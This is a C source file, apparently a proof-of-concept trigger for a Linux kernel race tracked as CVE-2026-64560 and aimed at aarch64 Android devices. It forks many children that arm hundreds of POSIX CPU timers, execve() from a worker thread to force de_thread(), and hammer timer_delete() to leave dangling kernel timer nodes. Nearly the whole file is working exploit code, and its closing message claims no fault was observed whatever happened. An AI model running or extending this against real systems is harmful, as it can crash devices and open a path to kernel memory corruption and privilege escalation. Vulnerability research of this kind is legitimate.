/*
 * cve64560_probe2.c — wider-window trigger for CVE-2026-64560
 *
 * Improvement over v1: each victim arms N timers (default 400) before the
 * execve storm, then deletes them all in a tight loop. Every delete is an
 * independent chance to land in the window where old_leader->sighand is NULL
 * but the task is still alive.
 *
 *   victim (child process, one per attempt):
 *     - arm N x timer_create(CLOCK_PROCESS_CPUTIME_ID, SIGEV_SIGNAL)
 *     - spawn worker thread that execve()s a real binary (triggers de_thread)
 *     - main thread hammers timer_delete() over all N
 *
 * Zero kernel offsets required. Writes nothing to any partition.
 *
 * Build:
 *   zig cc -target aarch64-linux-musl -static -O2 -pthread \
 *          -o cve64560_probe2 cve64560_probe2.c
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef SYS_timer_create
#define SYS_timer_create 107
#endif
#ifndef SYS_timer_settime
#define SYS_timer_settime 110
#endif
#ifndef SYS_timer_delete
#define SYS_timer_delete 111
#endif

#define CLK_PROC_CPU 2
#define MAX_TIMERS   512

static volatile int g_go;

static void *exec_worker(void *arg)
{
    while (!g_go) sched_yield();
    char *const argv[] = { (char *)"/system/bin/true", NULL };
    char *const envp[] = { NULL };
    execve(argv[0], argv, envp);
    _exit(7);   /* exec failed */
}

static void victim(int ntimers)
{
    struct sigevent ev;
    struct itimerspec its;
    timer_t tids[MAX_TIMERS];
    pthread_t th;
    int made = 0;

    memset(&ev, 0, sizeof ev);
    ev.sigev_notify = SIGEV_SIGNAL;
    ev.sigev_signo = SIGUSR1;

    memset(&its, 0, sizeof its);
    its.it_value.tv_sec = 3600;   /* far future: node stays on the rbtree */

    for (int i = 0; i < ntimers; i++) {
        if (syscall(SYS_timer_create, CLK_PROC_CPU, &ev, &tids[i]) != 0)
            break;
        syscall(SYS_timer_settime, tids[i], 0, &its, NULL);
        made++;
    }
    if (made == 0) _exit(3);

    g_go = 0;
    if (pthread_create(&th, NULL, exec_worker, NULL) != 0) _exit(4);
    g_go = 1;

    /* The window: de_thread() -> release_task(old_leader) -> sighand = NULL.
     * Every delete landing after that flag is cleared but before the task
     * memory is reclaimed leaves its k_itimer node dangling. */
    sched_yield();
    for (int i = 0; i < made; i++)
        syscall(SYS_timer_delete, tids[i]);

    _exit(0);
}

int main(int argc, char **argv)
{
    int attempts = (argc > 1) ? atoi(argv[1]) : 100;
    int ntimers  = (argc > 2) ? atoi(argv[2]) : 400;
    int par      = (argc > 3) ? atoi(argv[3]) : 8;

    if (ntimers > MAX_TIMERS) ntimers = MAX_TIMERS;
    if (par > 32) par = 32;

    fprintf(stderr, "[p2] attempts=%d timers=%d par=%d pid=%d\n",
            attempts, ntimers, par, getpid());

    for (int i = 0; i < attempts; i++) {
        pid_t pids[32];
        int n = par;
        for (int j = 0; j < n; j++) {
            pid_t p = fork();
            if (p == 0)
                victim(ntimers);
            pids[j] = p;
        }
        for (int j = 0; j < n; j++)
            if (pids[j] > 0) waitpid(pids[j], NULL, 0);

        if ((i % 10) == 0)
            fprintf(stderr, "[p2] attempt %d/%d\n", i, attempts);
    }

    fprintf(stderr, "[p2] finished, no kernel fault observed\n");
    return 0;
}
